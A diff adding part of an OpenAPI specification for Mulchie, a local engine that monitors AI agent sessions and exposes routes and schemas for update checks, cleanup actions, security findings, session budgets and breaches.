+                      The last check in full. Each tool in `agents` (and `mulchie`) has `path` (the
+                      binary found), `installed`, `latest`, `outdated`, `command`, `source` and
+                      `version_from` (where `installed` was read: `package.json at …` or
+                      `install path …`, or why it is unknown; agent tools are never run).
+                      `homebrew_path` is the `brew` that was run, when it was. `homebrew_skipped` is present
+                      only when Homebrew was not checked: `off`, `no_brew` or `no_core_tap`; a skipped
+                      check drops any earlier Homebrew result, while a `brew outdated` that ran and
+                      failed keeps the last one and adds an entry to `errors`.
+        default: { $ref: "#/components/responses/Error" }
+  /v1/updates/check:
+    post:
+      summary: Ask for an update check now
+      description: The check runs on the engine's update worker; poll `GET /v1/updates`. Full token only.
+      responses:
+        "200":
+          description: Queued
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  queued: { type: boolean }
+        "409": { description: "`updates_off`: `updates.check` is off", content: { application/json: { schema: { type: object } } } }
+        default: { $ref: "#/components/responses/Error" }
+components:
+  securitySchemes:
+    bearer:
+      type: http
+      scheme: bearer
+      description: The token from `<config dir>/token`, or the read-only one from `<config dir>/token.read`.
+  parameters:
+    IfMatch:
+      name: If-Match
+      in: header
+      required: false
+      description: The `revision` from `GET /v1/config`; the write happens only while the file is at it
+      schema: { type: string }
+    IfRevision:
+      name: if_revision
+      in: query
+      required: false
+      description: The same as `If-Match`, for clients that cannot set headers
+      schema: { type: string }
+  responses:
+    Json:
+      description: A JSON object
+      content:
+        application/json:
+          schema: { type: object }
+    Plan:
+      description: A plan; nothing was changed
+      content:
+        application/json:
+          schema: { $ref: "#/components/schemas/Plan" }
+    Results:
+      description: One result per item, in order
+      content:
+        application/json:
+          schema:
+            type: array
+            items: { $ref: "#/components/schemas/ActionResult" }
+    Error:
+      description: "An error: 400 bad body, 401 bad token, 403 refused origin, host or read-only token, 404, 405, 409, 413, 500"
+      content:
+        application/json:
+          schema:
+            type: object
+            required: [error, code]
+            properties:
+              error: { type: string }
+              code: { type: string, description: "A stable code, e.g. unauthorized, read_only_token, items_required, invalid_body" }
+  schemas:
+    Health:
+      type: string
+      enum: [good, busy, strained, critical, stale]
+    Items:
+      type: object
+      properties:
+        items: { type: array, items: { $ref: "#/components/schemas/Request" } }
+        auto: { type: boolean }
+    Request:
+      description: One action, as found in a plan item's `request`. Send it back unchanged.
+      type: object
+      required: [action]
+      properties:
+        action: { type: string, enum: [delete_cache, remove_worktree, prune_worktree, signal, renice, reopen_app] }
+        path: { type: string }
+        require_stale: { type: boolean }
+        expected_head: { type: string }
+        allow_dirty: { type: boolean }
+        require_idle: { type: boolean }
+        repo: { type: string }
+        pid: { type: integer }
+        signal: { type: string, enum: [term, kill, stop, cont] }
+        expected_start_time: { type: integer }
+        nice: { type: integer, description: For renice; only lowers priority }
+        bundle_id: { type: string, description: For reopen_app (macOS `open -b`) }
+        after_pid: { type: integer }
+        after_start_time: { type: integer }
+    Plan:
+      type: object
+      properties:
+        created_unix: { type: integer }
+        ready_bytes: { type: integer }
+        items:
+          type: array
+          items:
+            type: object
+            properties:
+              request: { $ref: "#/components/schemas/Request" }
+              target: { type: string }
+              name: { type: string }
+              repo_name: { type: [string, "null"] }
+              head: { type: [string, "null"] }
+              branch: { type: [string, "null"] }
+              bytes: { type: integer }
+              dirty_files: { type: integer }
+              idle_days: { type: [integer, "null"] }
+              ignored_files: { type: integer }
+              ignored_bytes: { type: integer }
+              would_backup: { type: array, items: { type: string } }
+              ready: { type: boolean }
+              reason: { type: [string, "null"] }
+              verdict: { type: string }
+    ActionResult:
+      type: object
+      required: [action, target, status]
+      properties:
+        action: { type: string, enum: [delete_cache, remove_worktree, prune_worktree, signal, renice, reopen_app] }
+        target: { type: string }
+        status: { type: string, enum: [done, skipped] }
+        freed_bytes: { type: integer }
+        backups:
+          type: array
+          items:
+            type: object
+            properties:
+              kind: { type: string, enum: [patch, ignored_archive, branch] }
+              location: { type: string, description: "A file path, or a branch name for kind branch" }
+        reason: { type: string }
+        detail: { type: string }
+        journal_error: { type: string, description: Set when the action ran but could not be written to the journal }
+    FindingKind:
+      type: string
+      enum:
+        - orphaned_process
+        - missing_working_directory
+        - executable_changed
+        - stale_process
+        - stopped_process
+        - runaway_cpu
+        - growing_memory
+        - exposed_listener
+        - temp_executable
+        - hidden_dir_executable
+        - system_name_mismatch
+        - unsigned_executable
+        - quarantined_executable
+        - insecure_permissions
+        - api_exposed
+        - engine_lock_not_held
+        - config_not_loaded
+        - limit_exceeded
+        - session_hog
+        - mulchie_update
+        - agent_update
+        - homebrew_outdated
+        - advisory
+        - paused_list_unreadable
+    FindingCounts:
+      type: object
+      properties:
+        info: { type: integer }
+        low: { type: integer }
+        medium: { type: integer }
+        high: { type: integer }
+        dismissed: { type: integer }
+    Finding:
+      type: object
+      required: [id, kind, severity, title, why, evidence, suggested, first_seen_unix, last_seen_unix, dismissed]
+      properties:
+        id: { type: string, description: "Stable while the cause lasts: <kind>:<pid>:<start_time>, or <kind>:<path or name>" }
+        kind: { $ref: "#/components/schemas/FindingKind" }
+        category: { type: string, enum: [security, hygiene, posture, limit, update] }
+        severity: { type: string, enum: [info, low, medium, high] }
+        title: { type: string, description: "One sentence, an observation" }
+        why: { type: string }
+        evidence:
+          type: object
+          description: Only the fields that apply are present. `cmd` is redacted.
+          properties:
+            pid: { type: integer }
+            start_time: { type: integer }
+            name: { type: string }
+            exe: { type: string }
+            cmd: { type: string }
+            cwd: { type: string }
+            workspace: { type: string }
+            age_secs: { type: integer }
+            parent: { type: object, properties: { pid: { type: integer }, name: { type: string } } }
+            listen: { type: array, items: { type: string } }
+            signature: { type: string, enum: [apple, app_store, developer_id, development, other_signed, ad_hoc, unsigned, unknown] }
+            quarantined: { type: boolean }
+            cpu_pct: { type: number }
+            mem_bytes: { type: integer }
+            path: { type: string }
+            mode: { type: string }
+            detail: { type: string }
+            updates:
+              type: array
+              description: Update findings only. One item per package.
+              items:
+                type: object
+                required: [package, source]
+                properties:
+                  package: { type: string }
+                  installed: { type: string }
+                  latest: { type: string, description: "The latest release; for an advisory, the first fixed version (absent when none is listed)" }
+                  source: { type: string, description: "github, npm, homebrew, osv.dev, …" }
+                  command: { type: string, description: What the user may run to update it; Mulchie runs nothing }
+        suggested:
+          type: array
+          items:
+            type: object
+            properties:
+              label: { type: string }
+              request: { $ref: "#/components/schemas/Request" }
+              api: { type: string, description: "Another route to call, in words, e.g. the dismiss route" }
+              api_request:
+                type: object
+                description: The same call as `api`, as data
+                required: [method, route]
+                properties:
+                  method: { type: string, enum: [GET, POST] }
+                  route: { type: string, description: "With path parameters filled in, e.g. /v1/sessions/s-1730000000-4242" }
+                  body: { type: object, description: The JSON body of a POST }
+              reversible: { type: boolean }
+        first_seen_unix: { type: integer }
+        last_seen_unix: { type: integer }
+        dismissed: { type: boolean }
+        dismissed_until: { type: integer }
+    Session:
+      type: object
+      properties:
+        id: { type: string }
+        agent: { type: string }
+        source: { type: string, enum: [detected, hook] }
+        status: { type: string, enum: [running, ended] }
+        root_pid: { type: integer }
+        root_start_time: { type: integer }
+        parent: { type: [string, "null"], description: The session that started this one }
+        client: { type: [string, "null"] }
+        client_session_id: { type: [string, "null"] }
+        command: { type: string, description: Redacted }
+        cwd: { type: [string, "null"] }
+        workspace: { type: [string, "null"] }
+        started_unix: { type: integer }
+        ended_unix: { type: [integer, "null"] }
+        listening: { type: array, items: { type: integer }, description: "Ports the session's processes listen on, from the last watch run" }
+        enforced:
+          type: boolean
+          description: >-
+            Whether a breach of this session's limits would be acted on by this engine (also on
+            each entry of `state.sessions.list`).
+        not_enforced_reason:
+          type: string
+          enum: [hook_registered, not_automating, no_budget, notify_only, ended]
+          description: >-
+            Present when `enforced` is false. `hook_registered`: a hook call named the session, so
+            Mulchie only reports. `not_automating`: this engine does not hold the lock or its
+            config did not load. `no_budget`: no budget applies to its workspace. `notify_only`:
+            every cap of its budget only notifies. `ended`: the session ended.
+        usage: { $ref: "#/components/schemas/SessionUsage" }
+        peak: { type: object, properties: { cpu_cores: { type: number }, memory_mb: { type: number }, processes: { type: integer }, write_mb_per_hour: { type: [number, "null"] } } }
+    SessionUsage:
+      type: object
+      properties:
+        cpu_cores: { type: number }
+        memory_mb: { type: number }
+        processes: { type: integer }
+        build_slots: { type: integer }
+        bytes_written: { type: [integer, "null"], description: Null where per-process writes cannot be read }
+        write_mb_per_hour: { type: [number, "null"] }
+        runtime_secs: { type: integer }
+    Breach:
+      type: object
+      description: A session over one cap of its budget.
+      properties:
+        id: { type: string }
+        session_id: { type: string }
+        agent: { type: string }
+        cap: { type: string, enum: [cpu_cores, memory_mb, processes, write_mb_per_hour, runtime_hours] }
+        max: { type: number }
+        value: { type: number }
+        peak: { type: number }
+        action: { type: string, enum: [notify, deprioritize, pause, stop] }
+        sustain_secs: { type: integer }
+        resume_after_secs: { type: integer }
+        over_since_unix: { type: integer }
+        breached_unix: { type: integer }
+        action_state: { type: string, enum: [pending, done, partial, skipped, notify_only, not_enforced] }
+        action_detail: { type: string }
+        cleared_unix: { type: [integer, "null"] }
+        restored: { type: boolean, description: A deprioritize or pause was undone }
+        delivered: { type: boolean, description: Handed to the agent in a hook reply }
+    PausedProc:
+      type: object
+      properties:
+        pid: { type: integer }
+        start_time: { type: integer }
+        session_id: { type: string }
+        breach_id: { type: string }
+        since_unix: { type: integer }
+        pausing: { type: boolean, description: "Recorded before SIGSTOP was sent and not yet confirmed; absent once it was" }
